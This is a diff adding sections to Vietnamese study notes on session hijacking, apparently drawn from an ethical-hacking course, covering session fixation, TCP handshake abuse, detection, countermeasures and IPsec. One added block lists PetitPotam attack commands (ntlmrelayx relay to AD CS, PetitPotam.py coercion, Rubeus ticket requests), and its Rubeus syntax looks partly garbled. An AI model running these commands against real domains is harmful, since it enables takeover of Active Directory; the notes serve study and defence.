@@ -34,12 +34,19 @@ Quá trình cướp phiên được chia thành ba giai đoạn chính:
 - **Cướp phiên thụ động (Passive Session Hijacking):** Kẻ tấn công chỉ quan sát và ghi lại tất cả lưu lượng thông qua network sniffers để thu thập session IDs và mật khẩu. Sau đó chúng dùng thông tin này để đăng nhập hợp lệ.
 - **Cướp phiên chủ động (Active Session Hijacking):** Kẻ tấn công chiếm đoạt một phiên hiện có bằng cách ngắt kết nối một phía hoặc tích cực tham gia (ví dụ: MITM attack). Để MITM thành công, kẻ tấn công đôi khi phải đoán được số thứ tự trước khi mục tiêu trả lời máy chủ.
 
-## 6. Giả mạo (Spoofing) vs. Chiếm quyền (Hijacking) [Trang 1555 - 1556]
+## 6. Cướp phiên trong Mô hình OSI (Session Hijacking in OSI Model) [Trang 1554]
+
+Có hai cấp độ cướp phiên trong mô hình OSI:
+
+- **Cướp phiên cấp mạng (Network-Level Hijacking):** Là việc đánh interception các gói tin trong quá trình truyền tải giữa client và server trong một phiên TCP/UDP. Một cuộc tấn công thành công cung cấp cho kẻ tấn công những thông tin quan trọng để tiếp tục tấn công các phiên cấp ứng dụng. Điểm nguy hiểm là nó tập trung vào luồng dữ liệu của giao thức nên không cần phải tinh chỉnh chi tiết cho từng ứng dụng web.
+- **Cướp phiên cấp ứng dụng (Application-Level Hijacking):** Đạt được quyền kiểm soát phiên người dùng HTTP bằng cách đánh cắp các session IDs. Nhờ đó, kẻ tấn công kiểm soát phiên hiện tại hoặc tạo các phiên trái phép mới. Thông thường, cả hai cuộc tấn công cấp mạng và cấp ứng dụng thường đi kèm với nhau.
+
+## 7. Giả mạo (Spoofing) vs. Chiếm quyền (Hijacking) [Trang 1555 - 1556]
 
 - **Giả mạo (Spoofing):** Kẻ tấn công mạo danh người dùng hoặc máy khác để giành quyền truy cập. Kẻ tấn công không chiếm quyền phiên đang hoạt động mà khởi tạo một phiên kết nối hoàn toàn mới bằng thông tin đăng nhập bị đánh cắp của nạn nhân. (Cần có quyền root để tạo các gói tin thô).
 - **Chiếm (Hijacking):** Kẻ tấn công giành quyền kiểm soát một phiên đang hoạt động (existing active session). Quá trình này phụ thuộc vào việc người dùng hợp pháp đã thiết lập kết nối và xác thực từ trước.
 
-## 7. Cướp phiên cấp ứng dụng (Application-Level Hijacking) [Trang 1558 - 1559]
+## 8. Cướp phiên cấp ứng dụng (Application-Level Hijacking) [Trang 1558 - 1559]
 
 Nhằm giành quyền kiểm soát phiên người dùng HTTP bằng cách lấy các session IDs. Có 3 kỹ thuật chính:
 
@@ -110,6 +117,10 @@ Các bước thực hiện tấn công Man-in-the-Browser [Trang 1565 - 1566]:
 - **Session Fixation (Cố định phiên)** [Trang 1571 - 1573]:
   - Bản chất: Đặt trước (fix) một Session ID hợp lệ thay vì đánh cắp ID sau khi đăng nhập.
   - Cách thức: Kẻ tấn công lấy một ID hợp lệ từ server, gài ID này vào trình duyệt nạn nhân (qua URL, cookie, form ẩn) và dụ nạn nhân đăng nhập. Khi nạn nhân đăng nhập thành công, phiên đó được xác thực với ID mà kẻ tấn công đã biết từ trước.
+  - **Các giai đoạn của một cuộc tấn công cố định phiên (Session Fixation phases):**
+    1. **Giai đoạn thiết lập (Session set-up phase):** Kẻ tấn công kết nối với máy chủ web mục tiêu để nhận một session ID hợp lệ. (Kẻ tấn công có thể phải gửi request liên tục để giữ cho session ID này không bị hết hạn/timeout).
+    2. **Giai đoạn cố định (Fixation phase):** Kẻ tấn công đưa session ID này vào trình duyệt của nạn nhân (thông qua link URL, hidden form, v.v.).
+    3. **Giai đoạn xâm nhập (Entrance phase):** Kẻ tấn công chờ nạn nhân đăng nhập vào máy chủ bằng session ID đã gài bẫy, sau đó chiếm quyền sử dụng phiên đó.
 - **Proxy-based Session Hijacking (Cướp phiên qua Proxy)** [Trang 1574]:
   - Bản chất: Đánh cắp phiên bằng cách đóng vai trò trung gian.
   - Cách thức: Kẻ tấn công dụ nạn nhân nhấp vào một liên kết giả (bogus link) chuyển hướng đến máy chủ của chúng. Kẻ tấn công hoạt động như một proxy, chuyển tiếp yêu cầu đến máy chủ hợp pháp và chụp (captures) toàn bộ thông tin phiên trong quá trình giao dịch.
@@ -150,6 +161,12 @@ Các bước thực hiện tấn công Man-in-the-Browser [Trang 1565 - 1566]:
 
 Tấn công cấp mạng dựa trên việc chặn các gói tin giữa client và server trong phiên TCP hoặc UDP. Ưu điểm là không yêu cầu quyền truy cập host và không cần điều chỉnh theo từng ứng dụng. Các kỹ thuật khai thác lỗ hổng (đặc biệt trong quá trình three-way handshake) bao gồm:
 
+- **Quá trình Bắt tay 3 bước của TCP (Three-way Handshake)** [Trang 1582 - 1583]: Để hiểu cách cướp phiên cấp mạng hoạt động, cần nắm rõ quy trình bắt tay 3 bước của TCP:
+  - Client khởi tạo kết nối bằng cách gửi Gói tin có cờ SYN cùng Số thứ tự khởi tạo (ISN) của nó. (Trạng thái: SYN-SENT).
+  - Server phản hồi bằng Gói tin có cờ SYN + ACK, xác nhận số thứ tự của Client và gửi kèm ISN của chính Server. (Trạng thái: SYN-RECEIVED).
+  - Client gửi lại Gói ACK, tăng số thứ tự lên 1 để hoàn tất. (Trạng thái: ESTABLISHED).
+  - _(Kẻ tấn công thường lợi dụng bước này: Bằng cách dự đoán chính xác Next Sequence Number (NSN), kẻ tấn công có thể chèn gói tin giả mạo vào luồng kết nối trước khi các bên hợp lệ kịp phản hồi)._
+
 - **TCP/IP Hijacking** [Trang 1584 - 1585]:
   - Sử dụng các gói tin giả mạo (spoofed packets) để chiếm quyền kiểm soát kết nối.
   - Kẻ tấn công đánh hơi (sniffs) kết nối của nạn nhân và sử dụng IP của nạn nhân để gửi một gói tin giả mạo mang số thứ tự (sequence number) dự đoán được.
@@ -186,6 +203,11 @@ Trong cả hai kỹ thuật này, kẻ tấn công sử dụng một packet snif
 
 - **Khái niệm:** Là cuộc tấn công ép buộc một Domain Controller (DC) phải khởi tạo xác thực tới server của kẻ tấn công.
 - **Cách thức hoạt động:** Kẻ tấn công sử dụng các lệnh gọi API của Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC) (cụ thể là lệnh `EfsRpcOpenFileRaw`) để ép buộc (coerce) quá trình xác thực. Bằng cách thao túng phiên từ một SMB Server giả mạo, kẻ tấn công lừa DC tin rằng chúng là người dùng hợp pháp để lấy được hàm băm NTLM (NTLM hash) của DC. Sau đó, kẻ tấn công chuyển tiếp (relay) xác thực NTLM này vào máy chủ Active Directory Certificate Services (AD CS) để tạo ra một chứng chỉ số. Có được chứng chỉ, kẻ tấn công chiếm ngay đặc quyền quản trị (admin-level privileges) và kiểm soát toàn bộ hạ tầng AD.
+- **Các lệnh thực thi PetitPotam Hijacking:**
+  - Xác định Tổ chức cấp chứng chỉ (Certificate Authority): `certutil.exe`
+  - Thiết lập HTTP/SMB cấu hình (dùng Impacket) để bắt thông tin xác thực từ DC: `ntlmrelayx.py -t <URL of Certificate authority with web enrolment> -smb2support --adcs --template DomainController`
+  - Ép buộc (coerce) quá trình xác thực thông qua gọi API MS-EFSRPC: `python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>` (Nếu DC có lỗ hổng, có thể chạy lệnh không cần credentials: `python3 PetitPotam.py <Attacker's IP> <IP of DC>`)
+  - Sau khi có NTLM hash của chứng chỉ, yêu cầu vé Kerberos (dùng Rubeus) để lấy đặc quyền: `Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain: domain name /user: <Domain username> /ptt /certificate: <NTLM hashes received from above command>`
 
 ## 17. Tóm tắt dạng khai thác và Bảng Kỹ thuật [Trang 1584 - 1592]
 
@@ -217,7 +239,13 @@ Trong cả hai kỹ thuật này, kẻ tấn công sử dụng một packet snif
 - **bettercap** [Trang 1593, 1595 - 1596]: Framework linh hoạt viết bằng ngôn ngữ Go. Hỗ trợ MITM, trinh sát và tấn công mạnh mẽ trên các mạng WiFi, Bluetooth Low Energy (BLE), thiết bị HID không dây và cả mạng IPv4/IPv6.
 - _(Bổ sung từ nguồn)_ Các công cụ khác: **OWASP ZAP**, **WebSploit Framework**, **sslstrip**, **Burp Suite**, **JHijack**.
 
-## 19. Công cụ phát hiện cướp phiên (Session Hijacking Detection Tools) [Trang 1603 - 1605]
+## 19. Phương pháp phát hiện Cướp phiên (Methods to detect session hijacking) [Trang 1598]
+
+- **Phương pháp Thủ công (Manual Method):** Sử dụng các phần mềm bắt gói tin (như Wireshark, SteelCentral Packet Analyzer) để giám sát traffic và tìm kiếm các dấu hiệu bất thường.
+- **Ép buộc Mục nhập ARP (Forced ARP Entry):** Thay thế địa chỉ MAC của máy bị xâm nhập bằng một MAC khác trong bộ nhớ đệm ARP của máy chủ để hạn chế lưu lượng mạng đến máy đó. Kỹ thuật này thường được áp dụng khi phát hiện: Cập nhật ARP lặp đi lặp lại (Repeated ARP updates), Các khung truyền mang địa chỉ MAC khác nhau, hoặc Bão ACK (ACK storms).
+- **Phương pháp Tự động (Automatic Method):** Sử dụng các hệ thống Phát hiện Xâm nhập (IDS) và Ngăn ngừa Xâm nhập (IPS) để đối chiếu gói tin mạng với cơ sở dữ liệu chữ ký tấn công.
+
+## 20. Công cụ phát hiện cướp phiên (Session Hijacking Detection Tools) [Trang 1603 - 1605]
 
 Các cuộc tấn công cướp phiên thường diễn ra âm thầm, giảm hiệu suất hệ thống. Việc phát hiện có thể sử dụng packet sniffers, IDSs và SIEM.
 
@@ -225,7 +253,27 @@ Các cuộc tấn công cướp phiên thường diễn ra âm thầm, giảm hi
 - **Wireshark** [Trang 1603 - 1605]: Công cụ cho phép bắt và duyệt traffic mạng tương tác. Dùng Winpcap để bắt gói tin trực tiếp từ các mạng Ethernet, IEEE 802.11, Token Ring, Bluetooth... giúp phát hiện hoạt động cướp phiên.
 - _(Bổ sung từ nguồn)_ Các công cụ khác: **Quantum Intrusion Prevention System (IPS)**, **SolarWinds Security Event Manager**, **IBM Security Network Intrusion Prevention System**.
 
-## 20. Ngăn chặn cướp phiên (Session Hijacking Countermeasures) [Trang 1606 - 1607, 1616 - 1618]
+## 21. Ngăn chặn cướp phiên (Session Hijacking Countermeasures) [Trang 1606 - 1607, 1616 - 1618]
+
+- **Các nguyên tắc bảo vệ chung (General Guidelines):**
+  - Sử dụng chuỗi dài hoặc số ngẫu nhiên lớn làm session keys.
+  - Triển khai cơ chế Đăng xuất (log-out) và Hết hạn phiên (timeout) tự động.
+  - Sử dụng các giải pháp IDS hoặc phần mềm ARPwatch để giám sát chống ARP Cache Poisoning.
+  - Sử dụng SFTP, FTPS, AS2 có hỗ trợ mã hóa và chứng chỉ số thay vì FTP. Tắt cơ chế nén HTTP (tránh CRIME attack).
+  - Chuyển đổi các mô hình mạng Hub cũ sang Switch.
+- **Hướng dẫn cho Nhà phát triển Web (Web Development Guidelines):**
+  - Tái tạo (Regenerate) Session ID mới ngay sau khi người dùng đăng nhập thành công (Chống Session Fixation).
+  - Mã hóa dữ liệu và session key truyền tải giữa người dùng và máy chủ (Sử dụng SSL/TLS).
+  - Giảm tuổi thọ (life span) của session hoặc cookie.
+  - Sử dụng các chỉ thị HTTP Headers nghiêm ngặt: `Cache-Control: no-cache, no-store` và `Pragma: no-cache`.
+  - Đảm bảo thuộc tính `HTTPOnly` và `Secure` flag khi gửi cookies để tránh bị kịch bản phía máy khách (như XSS) trích xuất.
+  - Xác minh IP và User-Agent của request hiện tại xem có khớp với nguồn tạo phiên ban đầu không.
+  - Sử dụng thuộc tính `SameSite` cookie để ngăn trình duyệt gửi cookies trong các request chéo trang (Chống CSRF).
+- **Hướng dẫn cho Người dùng Web (Web User Guidelines):**
+  - Không nhấp vào link lạ trong email, luôn sử dụng HTTPS khi nhập dữ liệu nhạy cảm.
+  - Sử dụng nút Log-out thay vì chỉ nhấn dấu "X" để đóng trình duyệt.
+  - Xóa bộ nhớ đệm (history, offline content, cookies) ngay sau mỗi phiên giao dịch quan trọng.
+  - Vô hiệu hóa tính năng tự động kết nối Wi-Fi mở (Disable auto-connect) và tránh giao dịch tài chính trên Wi-Fi công cộng. Tránh lưu mật khẩu trên trình duyệt.
 
 - **HTTP Strict Transport Security (HSTS)** [Trang 1606]: Chính sách bảo mật web bảo vệ khỏi MITM. HSTS ép buộc trình duyệt web chỉ giao tiếp với máy chủ bằng giao thức HTTPS an toàn, tự động chuyển đổi các kết nối HTTP không an toàn thành HTTPS.
 - **Token Binding** [Trang 1606 - 1607]: Client tạo ra một cặp khóa public-private cho kết nối. Khi gắn Session ID (token) vào kết nối, client ký nó bằng khóa private. Ngay cả khi kẻ tấn công bắt được token, chúng không thể phát lại (reuse) nó cho một kết nối khác vì không có khóa private tương ứng.
@@ -234,7 +282,7 @@ Các cuộc tấn công cướp phiên thường diễn ra âm thầm, giảm hi
   - **Fiddler:** Web debugging proxy ghi lại toàn bộ traffic HTTP(S), cho phép giải mã HTTPS và thao túng request bằng kỹ thuật giải mã MITM để debug và pentest.
   - _(Bổ sung từ nguồn)_ Các công cụ khác: **Nessus**, **Invicti**, **Wapiti**.
 
-## 21. Phương pháp ngăn MITM (Approaches to Prevent MITM Attacks) [Trang 1608 - 1610]
+## 22. Phương pháp ngăn MITM (Approaches to Prevent MITM Attacks) [Trang 1608 - 1610]
 
 Để chống lại MITM, quản trị viên áp dụng các giải pháp sau:
 
@@ -247,7 +295,7 @@ Các cuộc tấn công cướp phiên thường diễn ra âm thầm, giảm hi
 - **PKI và quản lý chứng chỉ:** Sử dụng Public Key Infrastructure cùng các Tổ chức cấp chứng chỉ (CAs) uy tín để xác minh danh tính kỹ thuật số.
 - **Phân đoạn mạng (Network segmentation):** Chia nhỏ mạng để hạn chế phạm vi di chuyển ngang (lateral movement) của kẻ tấn công và giới hạn khả năng chặn luồng liên lạc.
 
-## 22. Giao thức IPsec và các Modes [Trang 1611 - 1615]
+## 23. Giao thức IPsec và các Modes [Trang 1611 - 1615]
 
 IPsec (Internet Protocol Security) là bộ giao thức của IETF giúp bảo vệ IP communications bằng cách xác thực và mã hóa từng gói IP, rất phổ biến cho VPN. Bao gồm 2 chế độ chính:
 
@@ -256,3 +304,10 @@ IPsec (Internet Protocol Security) là bộ giao thức của IETF giúp bảo v
 - _(Bổ sung từ nguồn)_ **Kiến trúc IPsec** [Trang 1611, 1614 - 1615]: Sử dụng hai giao thức cốt lõi:
   - **AH (Authentication Header):** Chỉ cung cấp xác thực nguồn gốc và tính toàn vẹn (integrity), chống replay, không hỗ trợ mã hóa (no confidentiality).
   - **ESP (Encapsulating Security Payload):** Cung cấp đầy đủ cả xác thực, tính toàn vẹn và tính bảo mật (mã hóa/encryption). Đóng vai trò thiết yếu trong việc bảo vệ payload của dữ liệu.
+- **Các thành phần của cấu trúc IPsec (Components of IPsec)** [Trang 1612 - 1614]:
+  - **IPsec driver:** Phần mềm thực hiện chức năng mã hóa/giải mã ở cấp độ giao thức.
+  - **Internet Key Exchange (IKE):** Giao thức tạo khóa bảo mật.
+  - **Internet Security Association and Key Management Protocol (ISAKMP):** Phần mềm kết hợp các khái niệm xác thực, quản lý khóa và liên kết bảo mật (SA) để hai máy tính có thể mã hóa dữ liệu giao tiếp với nhau.
+  - **Oakley:** Giao thức sử dụng thuật toán Diffie-Hellman để tạo master key và khóa đặc thù cho từng phiên.
+  - **IPsec Policy Agent:** Dịch vụ trong Windows HĐH nhằm thực thi các chính sách IPsec.
+- **Quy trình hoạt động của IPsec:** Khi một máy gửi dữ liệu, IPsec driver khớp địa chỉ với bộ lọc IP -> Báo cho ISAKMP khởi tạo đàm phán -> Đàm phán trao đổi khóa (thiết lập SA) -> Mã hóa và gửi qua mạng -> Máy nhận dùng SA và Khóa tương ứng để kiểm tra chữ ký và giải mã.
